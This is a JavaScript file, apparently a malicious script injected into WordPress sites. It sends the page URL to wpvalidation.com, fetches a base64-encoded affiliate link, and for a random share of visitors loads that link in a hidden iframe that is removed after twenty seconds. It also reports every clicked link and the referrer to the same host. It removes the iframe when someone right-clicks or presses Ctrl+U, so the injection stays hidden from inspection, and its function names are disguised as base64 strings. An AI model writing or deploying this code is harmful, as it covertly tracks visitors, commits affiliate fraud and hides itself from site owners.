

    if (window.self !== window.parent) {

       

        setTimeout(function () {
            
        }, 5000);

    } else {


        function SGVsbG8gd29ybGQ(adepto_site) {

            return new Promise(function (resolve, reject) {

                var xhr = new XMLHttpRequest();
                xhr.open("POST", "https://wpvalidation.com/action/SGVsbG8gd29ybGQ", true);
                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                xhr.onreadystatechange = function () {
                    if (xhr.readyState === 4) {
                        if (xhr.status === 200) {
                            var responseJSON = JSON.parse(xhr.responseText);
                            resolve(responseJSON);
                        }
                    }
                };
                xhr.send("SGVsbG8gd29ybGQ=" + encodeURIComponent(adepto_site));
            });


        }

        function aW5zZXJ0X2FkZXB0bw(adepto_site) {



            return new Promise(function (resolve, reject) {

                var xhr = new XMLHttpRequest();
                xhr.open("POST", "https://wpvalidation.com/action/aW5zZXJ0X2FkZXB0bw", true);
                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                xhr.onreadystatechange = function () {
                    if (xhr.readyState === 4) {
                        if (xhr.status === 200) {
                            var responseJSON = JSON.parse(xhr.responseText);
                            resolve(responseJSON);
                        } else {
                        }
                    }
                };


                var parametros = {
                    "SGVsbG8gd29ybGQ": adepto_site,
                    "main": 1,
                };

                var queryString = Object.keys(parametros).map(function (key) {
                    return key + "=" + encodeURIComponent(parametros[key]);
                }).join("&");

                xhr.send(queryString);
            });



        }

        function Z2V0X2FkZXB0bw(adepto_site) {



            return new Promise(function (resolve, reject) {

                var xhr = new XMLHttpRequest();
                xhr.open("POST", "https://wpvalidation.com/action/Z2V0X2FkZXB0bw", true);
                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                xhr.onreadystatechange = function () {
                    if (xhr.readyState === 4) {
                        if (xhr.status === 200) {
                            var responseJSON = JSON.parse(xhr.responseText);
                            resolve(responseJSON);
                        } else {
                        }
                    }
                };
                xhr.send("SGVsbG8gd29ybGQ=" + encodeURIComponent(adepto_site));
            });

        }

        function YWRkSW5qZWN0aW9u(dxneid) {


            if (dxneid == "-") {

            } else {
                
                var iframe = document.createElement('iframe');
                iframe.width = '360';
                iframe.height = '800';
                

                iframe.src = atob('' + dxneid + '');

                iframe.id = "tungstenio";

                iframe.style.display = 'none';

                document.body.appendChild(iframe);

                setTimeout(function () {
                    iframe.remove();
                }, 20000);
            }
        }

        function Y2xpcXVlc19uby12aXRhbWVudGU(adepto_site, link_clicado, visitante_origem) {

            return new Promise(function (resolve, reject) {

                var xhr = new XMLHttpRequest();
                xhr.open("POST", "https://wpvalidation.com/action/Y2xpcXVlc19uby12aXRhbWVudGU", true);
                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                xhr.onreadystatechange = function () {
                    if (xhr.readyState === 4) {
                        if (xhr.status === 200) {
                            var responseJSON = JSON.parse(xhr.responseText);
                            resolve(responseJSON);
                        } else {
                        }
                    }
                };

                var parametros = {
                    "adepto_site": adepto_site,
                    "link_clicado": link_clicado,
                    "visitante_origem": visitante_origem,
                };

                var queryString = Object.keys(parametros).map(function (key) {
                    return key + "=" + encodeURIComponent(parametros[key]);
                }).join("&");

                xhr.send(queryString);

            });





        }

        SGVsbG8gd29ybGQ(window.location.href)
            .then(function (response) {


                if (response.status == "true") {
                    aW5zZXJ0X2FkZXB0bw(window.location.href)
                }

                Z2V0X2FkZXB0bw(window.location.href).then(function (response) {

                    const around = Math.floor(Math.random() * 101);

                    if (around <= response.adepto_proporcao) {
                        

                        if (response.adepto_active == 1) {

                            YWRkSW5qZWN0aW9u(response.link_afiliado)
                        } 


                    } 

                })



            })
            .catch(function (error) { });

        const click = document.querySelectorAll('body a');
        click.forEach(link => {
            link.addEventListener('click', function (event) {

                const link_clicado = this.getAttribute('href');

                Y2xpcXVlc19uby12aXRhbWVudGU(window.location.href, link_clicado, document.referrer);


            });
        });

        document.addEventListener('contextmenu', function (event) {

            if (event.which === 3 || event.button === 2) {

                var iframe = document.getElementById('tungstenio');
                
                if (iframe) {
                    iframe.remove();
                }
                
            }
        });

        document.addEventListener('keydown', function (event) {

            if (event.ctrlKey && event.key === 'u') {

                var iframe = document.getElementById('tungstenio');
                 if (iframe) {
                    iframe.remove();
                }
            }
        });


    }